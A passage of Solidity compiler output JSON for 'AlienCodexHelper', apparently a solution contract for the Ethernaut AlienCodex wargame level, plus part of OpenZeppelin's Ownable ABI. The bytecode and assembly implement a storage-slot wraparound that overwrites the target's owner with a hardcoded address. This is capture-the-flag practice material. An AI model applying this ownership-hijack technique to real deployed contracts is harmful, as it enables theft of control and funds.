							"object": "608060405234801561001057600080fd5b50610191806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806355ea6c4714610030575b600080fd5b6100726004803603602081101561004657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610074565b005b6000600190506000600182604051602001808281526020019150506040516020818303038152906040528051906020012060001c7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff030190508273ffffffffffffffffffffffffffffffffffffffff16630339f30082736343a423ab47cf92f89e2451171d38ac1d0606e96040518363ffffffff1660e01b8152600401808381526020018260001b815260200192505050600060405180830381600087803b15801561013f57600080fd5b505af1158015610153573d6000803e3d6000fd5b5050505050505056fea265627a7a72315820cf583a10b34be3b8e32f190fe297ebbc5602b94ca08b0f97b58b7e42cf572bfb64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x191 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x55EA6C47 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x46 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x74 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x0 SHR PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB ADD SWAP1 POP DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x339F300 DUP3 PUSH20 0x6343A423AB47CF92F89E2451171D38AC1D0606E9 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 PUSH1 0x0 SHL DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCF PC GASPRICE LT 0xB3 0x4B 0xE3 0xB8 0xE3 0x2F NOT 0xF 0xE2 SWAP8 0xEB 0xBC JUMP MUL 0xB9 0x4C LOG0 DUP12 0xF SWAP8 0xB5 DUP12 PUSH31 0x42CF572BFB64736F6C63430005100032000000000000000000000000000000 ",
							"sourceMap": "88:317:1:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:317:1;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c806355ea6c4714610030575b600080fd5b6100726004803603602081101561004657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610074565b005b6000600190506000600182604051602001808281526020019150506040516020818303038152906040528051906020012060001c7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff030190508273ffffffffffffffffffffffffffffffffffffffff16630339f30082736343a423ab47cf92f89e2451171d38ac1d0606e96040518363ffffffff1660e01b8152600401808381526020018260001b815260200192505050600060405180830381600087803b15801561013f57600080fd5b505af1158015610153573d6000803e3d6000fd5b5050505050505056fea265627a7a72315820cf583a10b34be3b8e32f190fe297ebbc5602b94ca08b0f97b58b7e42cf572bfb64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x55EA6C47 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x46 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x74 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x0 SHR PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB ADD SWAP1 POP DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x339F300 DUP3 PUSH20 0x6343A423AB47CF92F89E2451171D38AC1D0606E9 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 PUSH1 0x0 SHL DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCF PC GASPRICE LT 0xB3 0x4B 0xE3 0xB8 0xE3 0x2F NOT 0xF 0xE2 SWAP8 0xEB 0xBC JUMP MUL 0xB9 0x4C LOG0 DUP12 0xF SWAP8 0xB5 DUP12 PUSH31 0x42CF572BFB64736F6C63430005100032000000000000000000000000000000 ",
							"sourceMap": "88:317:1:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:317:1;;;;;;;;;;;;;;;;;;;121:281;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;121:281:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;180:14;197:1;180:18;;209:6;278:1;263:9;246:27;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;246:27:1;;;236:38;;;;;;231:44;;218:10;:57;:61;209:70;;301:14;290:33;;;324:1;327:66;290:104;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;290:104:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;290:104:1;;;;121:281;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "80200",
								"executionCost": "129",
								"totalCost": "80329"
							},
							"external": {
								"resolve(address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "MSTORE"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "POP"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "DUP1"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "CODECOPY"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 88,
									"end": 405,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820cf583a10b34be3b8e32f190fe297ebbc5602b94ca08b0f97b58b7e42cf572bfb64736f6c63430005100032",
									".code": [
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "MSTORE"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "POP"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "LT"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "JUMPI"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "SHR"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "DUP1"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "55EA6C47"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "EQ"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "JUMPI"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "JUMPDEST"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "DUP1"
										},
										{
											"begin": 88,
											"end": 405,
											"name": "REVERT"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "JUMPDEST"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "DUP2"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "ADD"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "AND"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "ADD"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP3"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP2"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "SWAP1"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "JUMPDEST"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "STOP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "JUMPDEST"
										},
										{
											"begin": 180,
											"end": 194,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 180,
											"end": 198,
											"name": "SWAP1"
										},
										{
											"begin": 180,
											"end": 198,
											"name": "POP"
										},
										{
											"begin": 209,
											"end": 215,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 278,
											"end": 279,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 263,
											"end": 272,
											"name": "DUP3"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "MLOAD"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "ADD"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "DUP1"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "DUP3"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "DUP2"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "MSTORE"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "ADD"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "SWAP2"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "POP"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "POP"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "SWAP1"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 246,
											"end": 273,
											"name": "MSTORE"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "DUP1"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "MLOAD"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "SWAP1"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "ADD"
										},
										{
											"begin": 236,
											"end": 274,
											"name": "KECCAK256"
										},
										{
											"begin": 231,
											"end": 275,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 231,
											"end": 275,
											"name": "SHR"
										},
										{
											"begin": 218,
											"end": 228,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 218,
											"end": 275,
											"name": "SUB"
										},
										{
											"begin": 218,
											"end": 279,
											"name": "ADD"
										},
										{
											"begin": 209,
											"end": 279,
											"name": "SWAP1"
										},
										{
											"begin": 209,
											"end": 279,
											"name": "POP"
										},
										{
											"begin": 301,
											"end": 315,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 323,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 290,
											"end": 323,
											"name": "AND"
										},
										{
											"begin": 290,
											"end": 323,
											"name": "PUSH",
											"value": "339F300"
										},
										{
											"begin": 324,
											"end": 325,
											"name": "DUP3"
										},
										{
											"begin": 327,
											"end": 393,
											"name": "PUSH",
											"value": "6343A423AB47CF92F89E2451171D38AC1D0606E9"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "MLOAD"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP4"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "AND"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "SHL"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP2"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "MSTORE"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "ADD"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP4"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP2"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "MSTORE"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "ADD"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "SHL"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP2"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "MSTORE"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "ADD"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "SWAP3"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "MLOAD"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP4"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "SUB"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP2"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP8"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "GAS"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "CALL"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 290,
											"end": 394,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 121,
											"end": 402,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"resolve(address)": "55ea6c47"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"alienCodexAddr\",\"type\":\"address\"}],\"name\":\"resolve\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/AlienCodexHelper.sol\":\"AlienCodexHelper\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/AlienCodex.sol\":{\"keccak256\":\"0x5a1d152f51b9c10d4b829ac248769cecd0d7a9b2664e257d3355a8afca61632f\",\"urls\":[\"bzz-raw://48a2f60e127602afef01a8312d379264018a4da7f9014cf2abbe67dbf81adee9\",\"dweb:/ipfs/QmZrjNo4KoxLL6LQjRrsfynjbWNq2MNWzW4m67ZfyYXBpp\"]},\"contracts/Ethernaut/AlienCodexHelper.sol\":{\"keccak256\":\"0x5a7190189e94dcf6dd364231502f20e7cd26d82d6a778c24c65120197a4bbd10\",\"urls\":[\"bzz-raw://c9b8cacaad93191e0b7ddb742e423c0a83063fe3a30b281d19360b82b136a0cb\",\"dweb:/ipfs/QmRTLucm9Cyoh77oPPyVQcYGSYtWdQbPaMguFX5295Dq5a\"]},\"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":{\"keccak256\":\"0x4d3de93fedfe39152201ffcc94cb9fa8ad80e5eae754e97c714057038f6beb5d\",\"urls\":[\"bzz-raw://a140c5698887488c3af1dcb9b661e83bcd9392449db8e111a19d5ba012f46208\",\"dweb:/ipfs/QmaK15toJWNimvohnYNTfvZK7akJUkWVVZajA1x638iRnP\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol": {
				"Ownable": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "previousOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnershipTransferred",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "isOwner",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "renounceOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "transferOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
